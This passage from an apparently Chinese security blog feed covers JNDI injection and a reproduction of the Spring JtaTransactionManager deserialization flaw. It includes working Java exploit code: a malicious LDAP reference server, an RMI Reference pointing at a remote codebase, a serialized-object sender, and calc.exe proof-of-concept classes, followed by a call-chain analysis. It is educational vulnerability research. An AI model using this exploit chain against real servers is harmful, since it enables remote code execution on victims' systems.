class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#EvilObject"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LdapClient.java，LDAP客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"ldap://localhost:1234/EvilObject"</span>);</span><br><span class="line">            String data = <span class="string">"This is LDAP Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilObject.java，恶意类，执行弹出计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2019/09/15/浅析JNDI注入/8.png" alt=""></p><h3 id="CORBA攻击向量"><a href="#CORBA攻击向量" class="headerlink" title="CORBA攻击向量"></a>CORBA攻击向量</h3><p>利用CORBA攻击向量进行JNDI注入的原理和RMI、LDAP是类似的，限于个人知识的匮乏，暂时写不了这章。 : (</p><h2 id="0x03-绕过高版本JDK限制"><a href="#0x03-绕过高版本JDK限制" class="headerlink" title="0x03 绕过高版本JDK限制"></a>0x03 绕过高版本JDK限制</h2><p>…</p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul><li>使用最新的JDK版本；</li><li>将外部数据传入InitialContext.lookup()方法前先进行严格的过滤；</li><li>使用安全管理器时，需要仔细审计安全策略；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://blog.csdn.net/u011721501/article/details/52316225" target="_blank" rel="noopener">BlackHat2016——JDNI注入/LDAP Entry污染攻击技术研究</a></p><p><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">Jndi注入及Spring RCE漏洞分析</a></p><p><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/" target="_blank" rel="noopener">BlackHat 2016 回顾之 JNDI 注入简单解析</a></p><p><a href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">Java代码审计学习之JNDI注入</a></p><p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="JNDI注入" scheme="https://www.mi1k7ea.com/tags/JNDI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>由JNDI注入引发的Spring Framework反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/</id>
    <published>2019-09-02T12:15:35.000Z</published>
    <updated>2019-09-02T16:03:57.073Z</updated>
    
    <content type="html"><![CDATA[<p>老早的漏洞了，问题是出在spring-tx-xxx.jar这个包。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>直接用的Github的项目：<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p><p>下载到本地，导入maven项目即可。</p><p>同时，为了顺利复现漏洞，JDK要在以下的版本之下：8u121、7u131、6u141。在上述版本之后的JDK中，都增加了com.sun.jndi.rmi.object.trustURLCodebase选项，其默认禁止RMI和CORBA协议使用远程codebase的选项。</p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="成功的Demo"><a href="#成功的Demo" class="headerlink" title="成功的Demo"></a>成功的Demo</h3><p>本次Demo就在Windows上测试，JDK版本为1.7.0_80。</p><p>为了方便，小改了下代码。</p><p><strong>ExploitableServer.java</strong></p><p>存在漏洞的服务端代码，全网监听1234端口，将连接上来的Socket数据流内容进行反序列化操作即readObject()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">1234</span>);</span><br><span class="line">System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">Socket socket=serverSocket.accept();</span><br><span class="line">System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());</span><br><span class="line">ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Object object = objectInputStream.readObject();</span><br><span class="line">System.out.println(<span class="string">"Read object "</span>+object);</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ExploitClient.java</strong></p><p>先创建注册表并监听在默认的1099端口，然后使用RMI+Reference的方式将referenceWrapper注册到Registry中、其中注册名为Object，然后和目标服务器建立连接，接着新建org.springframework.transaction.jta.JtaTransactionManager实例并调用setUserTransactionName来设置JNDI要查找的RMI服务地址、这里为本程序开启的Registry服务中绑定的object，最后将这个实例对象序列化之后发送给服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line">String localAddress= <span class="string">"127.0.0.1"</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">Socket socket = <span class="keyword">new</span> Socket(localAddress,port);</span><br><span class="line">System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line"></span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">objectOutputStream.writeObject(object);</span><br><span class="line">objectOutputStream.flush();</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ExportObject.java</strong></p><p>Reference引用指向的恶意类，这里我们在构造方法中实现运行计算器的功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行目标服务端ExploitableServer，监听着1234端口，其接受Socket数据并进行反序列化操作；</p><p>接着将编译后的ExportObject.class放在攻击者的服务器中，这里是Python直接启的Web服务；</p><p>最后运行客户端ExploitClient，其先启动Registry并将指向攻击者服务器的ExportObject.class的Reference引用绑定到注册表中，然后将设置里JNDI查询地址为Registry中绑定的object的实例对象序列化后发送给目标服务端程序；而目标服务端程序ExploitableServer接受到客户端ExploitClient发送的数据后，会对数据进行反序列化操作，其中会触发org.springframework.transaction.jta.JtaTransactionManager实例对象自定义的readObject()方法，调用lookup()查询恶意Reference引用指向的攻击者服务器中的ExportObject类，从而任意代码执行。</p><p>弹计算器是意料之中的，值得注意的是我本地的JDK版本是1.7.0_80：</p><p><img src="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/1.png" alt=""></p><h3 id="com-sun-jndi-rmi-object-trustURLCodebase"><a href="#com-sun-jndi-rmi-object-trustURLCodebase" class="headerlink" title="com.sun.jndi.rmi.object.trustURLCodebase"></a>com.sun.jndi.rmi.object.trustURLCodebase</h3><p>前面说到，在JDK版本8u121、7u131、6u141以后，com.sun.jndi.rmi.object.trustURLCodebase的默认值为false。</p><p>下面主要是为了看下高版本的报错情况，环境选在Linux中，其中JDK版本为1.8.0_222。</p><p>git clone下项目后，分别输入如下命令来运行服务端和客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> server</span><br><span class="line">mvn install</span><br><span class="line">java -cp <span class="string">"target/*"</span> ExploitableServer 9999</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> client</span><br><span class="line">mvn install </span><br><span class="line">java -cp <span class="string">"target/*"</span><span class="string">" ExploitClient 127.0.0.1 9999 127.0.0.1</span></span><br></pre></td></tr></table></figure><p>在客户端发送请求之后，在服务端可看到报错信息：</p><p><img src="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.TransactionSystemException: JTA UserTransaction is not available at JNDI location [rmi://127.0.0.1:1099/Object]; nested exception is javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &apos;com.sun.jndi.rmi.object.trustURLCodebase&apos; to &apos;true&apos;.</span><br></pre></td></tr></table></figure><p>可以看到主要的报错信息就是com.sun.jndi.rmi.object.trustURLCodebase默认为false，其是默认禁止RMI和CORBA协议使用远程codebase的选项，导致我们不能通过低版本中RMI+Reference的方式来实现JNDI注入从而实现触发反序列化漏洞执行任意代码。</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="函数调用链分析"><a href="#函数调用链分析" class="headerlink" title="函数调用链分析"></a>函数调用链分析</h3><p>由前面我们知道，传过去目标服务端进行反序列化操作的是经过序列化的org.springframework.transaction.jta.JtaTransactionManager实例对象，其在传输前还通过调用setUserTransactionName()来设置属性值为某个特定的JNDI。</p><p>由前面我们知道，传过去目标服务端进行反序列化操作的是经过序列化的org.springframework.transaction.jta.JtaTransactionManager实例对象，其在传输前还通过调用setUserTransactionName()来设置属性值为某个特定的JNDI。</p><p>下面我们跟进org.springframework.transaction.jta.JtaTransactionManager看看它的readObject()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Rely on default serialization; just initialize state after deserialization.</span></span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create template for client-side JNDI lookup.</span></span><br><span class="line">    <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a fresh lookup for JTA handles.</span></span><br><span class="line">    initUserTransactionAndTransactionManager();</span><br><span class="line">    initTransactionSynchronizationRegistry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到JtaTransactionManager类的readObject()方法被重写了，关注到调用了initUserTransactionAndTransactionManager()，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// Fetch JTA UserTransaction from JNDI, if necessary.</span></span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line"><span class="keyword">this</span>.userTransaction = lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line"><span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.userTransaction = retrieveUserTransaction();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line"><span class="comment">// Autodetect UserTransaction at its default JNDI location.</span></span><br><span class="line"><span class="keyword">this</span>.userTransaction = findUserTransaction();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// Fetch JTA TransactionManager from JNDI, if necessary.</span></span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.transactionManagerName)) &#123;</span><br><span class="line"><span class="keyword">this</span>.transactionManager = lookupTransactionManager(<span class="keyword">this</span>.transactionManagerName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.transactionManager = retrieveTransactionManager();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectTransactionManager) &#123;</span><br><span class="line"><span class="comment">// Autodetect UserTransaction object that implements TransactionManager,</span></span><br><span class="line"><span class="comment">// and check fallback JNDI locations otherwise.</span></span><br><span class="line"><span class="keyword">this</span>.transactionManager = findTransactionManager(<span class="keyword">this</span>.userTransaction);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If only JTA TransactionManager specified, create UserTransaction handle for it.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.transactionManager != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.userTransaction = buildUserTransaction(<span class="keyword">this</span>.transactionManager);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析得知，先判断JtaTransactionManager类的userTransaction属性值是否为空，若为空则进一步判断userTransactionName属性值是否为空，当不为空是则调用<code>lookupUserTransaction(this.userTransactionName)</code>。</p><p>进一步跟进lookupUserTransaction()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(</span><br><span class="line"><span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中直接调用getJndiTemplate().lookup()函数来查找注册表中的远程对象。为了确认lookup()函数是否是JNDI注入常用的那个，再跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">Object located = ctx.lookup(name);</span><br><span class="line"><span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(</span><br><span class="line"><span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned 